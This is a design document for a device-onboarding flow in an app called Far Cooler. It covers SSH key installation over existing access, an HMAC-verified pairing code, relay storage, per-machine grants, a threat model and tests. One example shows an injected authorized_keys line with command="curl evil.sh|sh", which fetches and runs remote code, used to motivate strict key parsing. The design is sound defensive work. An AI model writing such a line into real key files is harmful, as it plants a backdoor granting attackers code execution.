# Onboarding a device without copying a key

Today, putting Far Cooler on a phone means reading a 400-character public key
off one screen, getting it onto a machine somehow, running a shell command
there, and then typing an address, a user and a port back into the app. Every
step is manual and every step is the kind of manual that people do once and
then avoid doing again.

This designs the flow that replaces it. A device you already trust shows an
eight-character code, you type it on the new device, you pick which machines it
may reach, and the trusted device installs the key over the SSH access it
already has.

The manual path is not removed. It is what works when there is no account, no
trusted device, and nothing left but a machine you can still log into — which
is exactly the situation in which a recovery path has to work.

## What is wrong today

`AuthorizeView` in `apps/ios/FarCooler/FarCoolerApp.swift` shows the device's
public key and tells you to run `echo '<paste>' >> ~/.ssh/authorized_keys`.
`Screens.kt` says the same thing on Android. Then `HostEditorView` asks for a
label, an address, a user and a port, and the first connection asks you to
approve a host key fingerprint you have no way to check from a phone.

The design document already disagrees with this. `docs/farcooler-design.md:1007`
says the first device enrolls using access the user already has, and
`:867` says every device self-enrolls with the SSH access it already has. That
was never built, so the fallback became the whole flow.

Meanwhile the account plumbing exists and already moves a credential in the
opposite direction: a signed-in app calls `/v1/daemons`, receives a bearer
token, and hands it to a machine over SSH (`farcooler push pair`, token on
stdin). The relay knows which accounts exist, which devices they own and which
machines they have paired.

## The rule that makes this safe

**The relay never touches a machine.**

A key is installed by a device that already holds a shell there, over plain
SSH, using an existing pinned host key. So a compromised relay cannot grant
access. It can carry a request, and it can fail to carry one. It cannot answer
one.

That is the whole security argument, and everything below is in service of it.

Its corollary decides the scope question, and decides it in sshd rather than in
our code. A `control` device holds a plain key, which is a shell, so it can
append to `authorized_keys` and can therefore grant access. A `read` device
holds `restrict` plus a forced command, so it has no shell, so it cannot grant
access to anyone. **The privilege to grant access is exactly the privilege you
already hold.** There is no separate permission to get wrong.

## The code goes from the trusted device to the new one

The direction matters. Carrying a fingerprint from the new device to the
trusted one is a comparison a human might fudge. Carrying a freshly generated
secret the other way is something the protocol can verify.

1. **On a device you already trust**, tap **Add a Device**. It generates `S` —
   eight characters of Crockford base32, no lookalike letters — displays it,
   and holds it in memory for ten minutes.

2. **On the new device**, sign in and type the code. It generates its ed25519
   key in the Secure Enclave or the Android Keystore and posts
   `{name, public key, proof}`, where

   ```
   proof = HMAC-SHA256(key: S, message: public key)
   ```

3. **The relay** stores the row and pushes to every trusted device on the
   account. It verifies nothing, because it does not know `S`.

4. **The trusted device** recomputes the HMAC over the public key it received.
   It generated `S` seconds ago, so this is a local comparison against a secret
   no server has ever seen.

   - Match: show the confirmation, then install.
   - Mismatch: count it. Ten failures ends the flow and says plainly that
     someone with account access is filing requests.

   Every *other* trusted device cannot verify anything, so it shows a notice
   with nothing to tap.

5. **The trusted device installs**, per machine the person picked, over SSH.

6. **The trusted device posts the reachability details** for those machines —
   address, user, port, host key fingerprint — encrypted to the new device's
   SSH public key. `age` accepts `ssh-ed25519` recipients directly.

7. **The new device collects them** and connects with host keys already pinned,
   so the unknown-host prompt never appears.

`S` never reaches the relay in any form, hashed or otherwise. A hash of a
40-bit secret is a few GPU-seconds from being the secret, and this repository
is open source: an attacker has the algorithm either way, and must still
produce a preimage they cannot compute.

## What the relay stores

| | |
| --- | --- |
| Devices | id, label, push token, **public key**, created_at |
| Machines | id, label — the existing `daemons` rows |
| Enrollment requests | account, name, public key, proof, created_at · **10-minute TTL** |
| Reachability blobs | opaque ciphertext addressed to one device |
| Grants | **nothing** |

The relay knows a machine exists and what you call it. It never learns how to
reach one. It stores no grant, so there is no cached answer anywhere that can
disagree with the file that decides.

Its stored public key is **display-only** — see the invariant below.

Three routes, all session-authenticated and rate-limited:

- `POST /v1/enroll/request` — file a request.
- `POST /v1/enroll/fetch` — this account's requests from the last ten minutes,
  plus any ciphertext addressed to the calling device. Both sides use it: the
  trusted device to read requests after a push, the new device to collect its
  reachability details once approved. It is a fetch, not a polling loop.
- `POST /v1/enroll/complete` — store the ciphertext for the new device.

A device's row in `devices` is created by the new device itself once the flow
completes, through the existing `/v1/devices` route that already registers its
push token. Its public key is written there at the same time. A request that is
never approved leaves no device behind.

## Notifications

Push goes to every trusted device on the account whenever a request arrives.
This is deliberate: **an unexpected notification is evidence of a compromised
account**, and that evidence should reach every device you own rather than
whichever one you happen to be holding.

The relay cannot tell a real request from a forged one, so it pushes on all of
them and lets the devices decide what it means. No action button; tapping opens
the app. Approval requires the HMAC, so a notification can only ever make a
screen appear.

Rate-limited at the relay to a handful per account per hour, and coalesced on
the device — three rejected attempts is one notice saying three.

The device showing the code also refreshes while that screen is up, so a
dropped push does not strand someone mid-enrollment. That is the screen
updating itself, not a security mechanism.

## Installing the key

From the trusted device, per machine, with the line on **stdin**:

```
ssh user@host 'umask 077; mkdir -p ~/.ssh; cat >> ~/.ssh/authorized_keys'
```

Two rules make this reviewable.

**The key never enters a shell command string.** On stdin, shell quoting has no
bearing on it, so there is no injection surface to reason about.

**Never write bytes that came off the wire.** `authorized_keys` is
line-oriented and every line may carry options *before* the key, so appending a
received string can append more than one line:

```
ssh-ed25519 AAAAC3Nza...legit device
command="curl evil.sh|sh" ssh-ed25519 AAAAC3Nza...attacker
```

One value from the wire, two lines in the file, and the second grants a
stranger a key that runs a command on every connection. Nothing about the write
is malformed and it succeeds.

Parsing first makes that unrepresentable:

```rust
let key = ssh_key::PublicKey::from_openssh(received)?;   // rejects trailing junk
let line = format!("{} {} farcooler-{}", key.algorithm(), key.to_openssh()?, safe_name);
```

An embedded newline, an options field, a second key or trailing garbage fails
the parse and never reaches the file. The comment is regenerated from the device
name filtered to `[A-Za-z0-9_-]` rather than taken from the wire, because it is
attacker-controlled text that a person later reads to decide what to revoke.
`ssh-key` is already in the tree through russh.

Append-only, so a botched write leaves a stray line rather than a locked-out
machine. Refuse a key already present, and refuse one matching another device's
key under a different name.

**Revocation is the dangerous direction**, because removing a line means
rewriting the file. Temporary file, `fsync`, rename, and a checksummed backup —
the same care `docs/farcooler-design.md:1017` already demands.

## Grants are per machine

A device is not trusted globally. It holds a grant on each machine separately,
and a machine added next month grants nothing to anyone automatically. That is
what lets one account hold both a work machine and a personal phone without
either reaching the other.

So the confirmation defaults to **only the machine being granted from**:

> ### Add "iPhone 17"?
>
> iPhone 17 will be able to run agents and commands on the machines you pick,
> as you.
>
> **SHA256:t7Xq…9Vd** ⌄
>
> ☑︎ MacBook Pro · this Mac
> ☐ box
> ☐ work-mini · needs a device that already reaches it
>
> Far Cooler adds this key to `~/.ssh/authorized_keys` on each machine you
> pick, and changes nothing else. You can add or remove machines later in
> Settings › Devices.
>
> **[ Add Device ]**  [ Cancel ]

A machine this device cannot reach is disabled with the reason, because you can
only grant what you already hold.

Afterwards the same list is **Settings › Devices › iPhone 17**, a checkbox per
machine. Checking grants, unchecking revokes, one screen for both directions.

The confirmation grants `control`, because a device that cannot answer an agent
is a device that cannot do the thing this product exists for. `read` is set
afterwards from that same per-machine screen, and it says out loud that a
`read` device can no longer grant access to anything — which is not a policy we
enforce, but a consequence of it having no shell.

Machines that were asleep at confirmation time stay pending and install when
this device next reaches them.

## The list of devices, and of machines

Existence is stored. Access is derived.

**`authorized_keys` is the only authority on access.** A machine's daemon reads
its own fence and reports the enrolled fingerprints — the existing
`farcooler client list`. The matrix is derived on every look, so no grant
recorded anywhere can disagree with the file.

A device determines its own status without asking anyone:

| State | Means |
| --- | --- |
| Authorized | It connected. |
| Not authorized | sshd rejected the key. That is the answer, not a guess. |
| Unknown | The machine did not answer. Not resolved to either, like `LOST`. |

**Names come from the fence.** The comment is already `farcooler-<device name>`,
so a machine lists its own devices with no network at all. The relay's roster
adds only devices granted nowhere yet — and surfaces the useful third case, a
fence entry matching no device on the account, shown as an unknown key with its
fingerprint and a way to remove it.

**Never install a key the relay handed you.** Its stored public key is for
displaying a fingerprint in a list. Every write sources the key from ground
truth: the HMAC-verified enrollment, or the fence of a machine that already
holds it. If neither exists, the granting device says so and points back at the
code flow. This is what keeps a compromised relay out of the later-grant path,
where there is no HMAC to protect it.

**Removal is honest.** Deleting a device from the account stops its
notifications and does nothing to its SSH access, so "Remove Device" walks the
grants first, unchecking each machine it can reach and naming the ones it
cannot:

> iPhone 17 still has access to **box**, which isn't reachable right now.
> Remove it from box when you next reach it, or run `farcooler client revoke`
> there.

## Remote Login

A phone reaches a Mac over SSH, and macOS ships with Remote Login off. Shown
when a Mac is added as a machine, and again on any device that cannot reach it:

> ### Turn on Remote Login
>
> Your other devices reach this Mac over SSH, and macOS keeps that off until
> you allow it.
>
> Open System Settings › General › Sharing and turn on Remote Login.
>
> **[ Open Sharing Settings ]**

An ungranted machine, on any device:

> ### box hasn't authorized this iPhone
>
> Grant access from a device that already reaches box — open Settings › Devices
> › iPhone 17 there and add box.
>
> Or add this device's key to `~/.ssh/authorized_keys` on box yourself.
>
> **[ Copy This Device's Key ]**

## Every flow

**Adding a machine.** It appears on the account with a label, granted to
nothing.

| | |
| --- | --- |
| A Mac you are sitting at | Install the app. Local daemon over a Unix socket — no key, no SSH. |
| Remote server, from a Mac | Pick it from `~/.ssh/config` or type `you@box`. Your existing SSH installs the daemon. |
| Remote server, from a phone | Through a machine that already reaches it, using *its* SSH. |
| Remote server, phone alone | Manual — put the key on the box with the access you already have. |
| Any time | `farcooler host install you@box`. |

**Adding a device.** A phone or a Mac, the same flow either way.

| | |
| --- | --- |
| With a trusted device | The code flow: *Add a Device*, type the code, pick machines, confirm. |
| A new Mac, no trusted device | It has local shell over itself, so it grants other devices from itself. |
| A new phone, no trusted device | Manual. It becomes a root once enrolled. |
| Any time | Copy the key, paste into `authorized_keys`. |

**Granting an existing device access to a machine.**

| | |
| --- | --- |
| From the machine itself | A Mac you are at: Settings › Devices → check the device. Local write, no SSH. |
| From another device | Any device holding `control` there: the same screen. |
| Any time | Paste the key into `authorized_keys` yourself. |

A new Mac joining is two rows at once — a machine nothing can reach and a
device nothing has granted — and because it holds local shell over itself, it
is the one place that can resolve the first half without asking anyone.

The code flow requires an account. The manual path is the one that works
without one, and the one that works when every device is lost.

## Threat model

| Adversary | Outcome |
| --- | --- |
| Anonymous internet | Cannot file a request — it needs an account session. |
| WorkOS account takeover | Can file requests, cannot answer one: 40 bits of `S` with ten attempts. Every trusted device is notified, so it surfaces the compromise. |
| Compromised relay or D1 | Cannot forge a proof, cannot reach a machine, cannot read a reachability blob, cannot get a key installed through the later-grant path. Can suppress requests, and learns device names and public keys. |
| Network attacker on the relay path | Nothing beyond the above. The mailbox is untrusted by design. |
| MITM between trusted device and machine | Refused — the host key is already pinned. |
| Hostile key bytes | Parsed and re-serialized, so options fields, embedded newlines and second keys cannot reach the file. |
| Shoulder-surfing the code | **Works, within ten minutes.** Requires physical proximity — the accepted cost of a human-carried secret. |
| Stolen unlocked trusted device | **Works.** It already holds SSH. Mitigated by Face ID on the confirmation, a fresh-authentication requirement, and revocation from any other device. |
| Stolen untrusted phone | Cannot file a request anyone will approve. |
| Every device lost | Ordinary SSH plus `farcooler client revoke`. No account-recovery bypass, deliberately. |

Requiring TOTP on the WorkOS account is worth doing and is defense in depth,
not the defense. Note that the requirement does not apply to SSO users, so it is
not something to lean on. `auth_time` and `max_age` are the step-up primitive
for the confirmation screen.

## Testing

- **Key rendering.** Golden-file tests over the parse-and-re-serialize path: an
  embedded newline, a leading options field, two keys in one value, trailing
  garbage, a hostile comment. Each must produce a refusal or exactly one
  canonical line.
- **Proof verification.** A matching HMAC accepts; a mismatched one is counted
  and discarded; ten failures end the flow.
- **Fence safety.** The existing `authorized_keys::fence_safety` fixture
  extended to cover append and removal, proving no entry Far Cooler did not
  write is ever moved or lost.
- **Idempotency.** Approving the same device twice adds one line.
- **Derivation.** A device whose line is deleted by hand reports *not
  authorized* on its next look, with no reconciliation step.
- **Expiry.** A request older than ten minutes is not returned by poll.

## Deferred

- **A local-network path**, so two devices on one LAN could run the code flow
  with no account. It is a second implementation of the same handshake and
  earns its place only if people ask for it.
- **Granting across machines a device has never met.** Today the answer is to
  run the code flow again, which is honest and rare.
- **Bulk grant.** "Every machine" is one checkbox away from existing and is
  deliberately not offered, because the default this document argues for is the
  opposite.
